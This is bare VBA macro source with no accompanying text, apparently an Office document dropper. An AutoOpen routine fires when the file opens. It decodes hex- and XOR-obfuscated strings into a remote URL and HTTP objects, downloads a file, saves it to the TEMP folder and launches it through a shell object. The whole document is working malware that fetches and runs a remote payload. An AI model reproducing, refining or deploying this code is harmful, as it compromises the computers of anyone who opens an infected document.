Public Function Hextostring(ByVal paramString As String) As String

    Dim current As String
    Dim output As String
    Dim index As Long
    
    For index = 1 To Len(paramString) Step 2
        current = Chr$(Val("&" & "H" & Mid$(paramString, index, 2)))
        output = output & current
    Next index
    
    Hextostring = output

End Function

Sub AutoOpen()
    IOWZJGNTSGK
End Sub

Function ZUWSBYDOTWV(ByVal FYAMZFQXNVI As String, ByVal CVUDEDVJFST As String) As Boolean
    Dim VPBCRFOQENN As Object, LSFYHUDVCYR As Long, QSBXXUZTKRD As Long, MDLLXOKIXRV() As Byte

    Set VPBCRFOQENN = CreateObject(XORI(Hextostring("3F34193F254049193F253A331522"), Hextostring("7267417269")))

    VPBCRFOQENN.Open XORI(Hextostring("00353B"), Hextostring("47706F634E")), FYAMZFQXNVI, False
    VPBCRFOQENN.Send XORI(Hextostring("2B0F25162232"), Hextostring("4C596D54"))


    MDLLXOKIXRV = VPBCRFOQENN.responseBody

    QSBXXUZTKRD = FreeFile
    Open CVUDEDVJFST For Binary As #QSBXXUZTKRD
    Put #QSBXXUZTKRD, , MDLLXOKIXRV
    Close #QSBXXUZTKRD

    Set hBBkbmop6VHJL = CreateObject(XORI(Hextostring("020A271C3D4C0300210E2B1330162B1F3F"), Hextostring("51624270")))
    hBBkbmop6VHJL.Open Environ(XORI(Hextostring("3C3F3A03"), Hextostring("687A7753"))) & XORI(Hextostring("1217092B0F0718371F1F133560362807"), Hextostring("4E535062"))

End Function

Sub IOWZJGNTSGK()
    gGHBkj = XORI(Hextostring("1C3B2404757F5B2826593D3F00277E102A7F1E3C7F16263E5A2A2811"), Hextostring("744F50"))
    ZUWSBYDOTWV gGHBkj, Environ(XORI(Hextostring("3E200501"), Hextostring("6A654851714A64"))) & XORI(Hextostring("11371B0A00123918220E001668143516"), Hextostring("4D734243414671"))
End Sub

Public Function XORI(ByVal cipher As String, ByVal key As String) As String
    Dim index As Long
    For index = 1 To Len(cipher)
        XORI = XORI & Chr(
            Asc(
                Mid(
                    key,
                    IIf(
                        index Mod Len(key) <> 0,
                        index Mod Len(key),
                        Len(key)
                        ),
                    1
                )
            ) Xor 
            Asc(
                Mid(cipher, index, 1)
            )
        )
    Next index

End Function
